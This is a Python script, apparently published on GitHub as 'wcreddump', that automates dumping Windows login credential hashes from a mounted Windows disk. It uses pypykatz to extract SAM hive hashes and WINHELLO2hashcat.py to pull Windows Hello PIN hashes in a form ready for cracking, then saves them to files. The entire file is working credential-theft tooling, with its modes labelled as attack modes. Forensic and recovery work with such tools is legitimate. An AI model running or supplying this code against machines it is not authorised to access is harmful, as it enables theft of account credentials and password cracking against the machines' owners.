# wcreddump (windows credentials dumper)
# Automated script to dump login credentials hashes on windows disks, classic passwords and pins
#
#Requires the following conditions :
# - To be run from a GNU/linux's terminal (python wcreddump.py)
# - pypykatz installed on system (apt install pypykatz)
# - python >=3.10 with the following libs installed : dpapick3, PyCryptodome (pip install dpapick3 PyCryptodome)
# - WINHELLO2hashcat.py in the same directory as wcreddump.py (https://github.com/Banaanhangwagen/WINHELLO2hashcat)
# - A mounted drive with a windows os on it
#
# Author : https://github.com/truerustyy
# GitHub : https://github.com/truerustyy/wcreddump

from subprocess import check_output
from argparse import ArgumentParser, BooleanOptionalAction, RawDescriptionHelpFormatter
from psutil import disk_partitions
from time import time
import os

### INIT + PARSER ###
scriptPath = os.path.dirname(__file__)
disks = disk_partitions()
t = round(time(), 3)

parser = ArgumentParser(prog="wcreddump", formatter_class=RawDescriptionHelpFormatter, description="Automated script to dump login credentials hashes on windows disks, classic passwords and pins\nAll flags are completely optionnal, script will ask during execution if informations are needed\nhttps://github.com/truerustyy/wcreddump", epilog="usage exemple :\npython wcreddump.py\npython wcreddump.py --no-save --os -m 1\npython wcreddump.py -p \"/path/to save/folder\" -c path/to/disk -m 2")
parser.add_argument("--save", help="dump hashes/os info into files, default to True", action=BooleanOptionalAction, type=bool, default=True)
parser.add_argument("--os", help="dump some os info with hashes, default to False", action=BooleanOptionalAction, type=bool, default=False)
parser.add_argument("-p", help="path to save files, default to /[wd]/outputs/", type=str, default=scriptPath+"/outputs/")
parser.add_argument("-d", help="path to mounted Windows system disk, automated selection by default", type=str, default=False)
parser.add_argument("-m", help="attack mode (SAM, WINHELLO, both), default to 2", type=int, default=2, choices=[0, 1, 2])
args = parser.parse_args()

autosave, dumpInfos, savePath, mode, C = args.save, args.os, args.p, args.m, args.d

### DEBUG ###
if os.name == "nt" :
    print("wcreddump need to be run from a linux/Unix environement, please read doc")
    exit()
if autosave and not os.path.isdir(savePath) :
    os.makedirs(savePath)
if savePath[-1] not in ["\\", "/"] :
    savePath += "/"
if (not autosave and scriptPath+"/outputs/" != savePath) or (not autosave and dumpInfos) : #if selected save path/os info but save de-activated
    raise ValueError("save diseabled but os info or path flag set, please make sure flags are coherent")

### DISK SELECTION ###
if not C :
    drives = {}
    i = 0
    print("selectable drives : ")
    for disk in disks :
        if disk.fstype == "fuseblk" :
            name, mnt = disk.mountpoint.split("/")[-1], disk.mountpoint
            drives[name] = disk.mountpoint
            print(f"{name}")
            i += 1
    if i == 0 :
        print("no available drive, please make sure that a windows hard drive is mounted")
        exit()
    elif i == 1 :
        print(f"select windows system drive : {name}") 
        drive = name
    else :
        drive = input(f"select windows system drive : ")
    if drive not in drives :
        raise ValueError(f"selected drive ({drive}) not found in list")
    else :
        C = drives[drive]
    print()

if not os.path.isdir(f"{C}/Windows/System32") :
    raise ValueError("selected drive is not a windows system drive")

### ATTACK MODE SELECTION ### --> deprecated with parser, uncoment and set -d default to False to use
#if not mode and not type(mode) == int :
#   print("0 : dump SAM hive\n1 : dump WINHELLO\n2 : dump both if possible")
#   mode = int(input(f"select attack mode (0-2) : "))
#   print()

### SAM DUMPING ###
if mode == 0 or mode == 2 :
    print("dumping sam...")
    path = f"{C}/Windows/System32/config"
    print(f"full path to SAM hive : \"{path}\"")
    os.chdir(path)
    raw = check_output("pypykatz registry --sam SAM --security SECURITY --software SOFTWARE SYSTEM", shell=True).decode()
    sam = "\n".join(raw.split("============== SAM hive secrets ==============")[1].split("============== SECURITY hive secrets ==============")[0].split("\n")[2:])
    print("\n"+sam)
    os.chdir(scriptPath)
    if autosave :
        with open(f"{savePath}SAM ({drive})-{t}", "w") as f :
            f.write(sam)
        print(f"succesfully dumped SAM's hash.es to \"SAM ({drive})-{t}\"\n")
        if dumpInfos :
            with open(f"{savePath}INFOS ({drive})-{t}", "w") as f :
                f.write(raw)
            print(f"succesfully dumped OS infos to \"INFOS ({drive})-{t}\"\n")

### WINHELLO DUMPING ###
if mode == 1 or mode == 2 :
    print("dumping WINHELLO...")
    if os.path.isdir(C+"/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/") :
        if os.listdir(C+"/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/") != []:
            cryptokeys = f'--cryptokeys  "{C}/Windows/ServiceProfiles/LocalService/AppData/Roaming/Microsoft/Crypto/Keys/"'
            masterkey = f'--masterkey "{C}/Windows/System32/Microsoft/Protect/S-1-5-18/User/"'
            system = f'--system "{C}/Windows/System32/config/SYSTEM"'
            security = f'--security "{C}/Windows/System32/config/SECURITY"'
            ngc = f'--ngc "{C}/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/"'
            try :
                hashes = check_output(f"python WINHELLO2hashcat.py {cryptokeys} {masterkey} {system} {security} {ngc}", shell=True).decode()
                print(hashes)
                if autosave :
                    with open(f"{savePath}WINHELLO ({drive})-{t}", "w") as f :
                        f.write(hashes)
                print(f"succesfully dumped WINHELLO pin.s to \"WINHELLO ({drive})-{t}\"")
            except :
                print("error on dumping, see https://github.com/Banaanhangwagen/WINHELLO2hashcat")
        else :
            print("no WINHELLO on system")
    else :
        print("ivalid windows version for WINHELLO (likely too old)")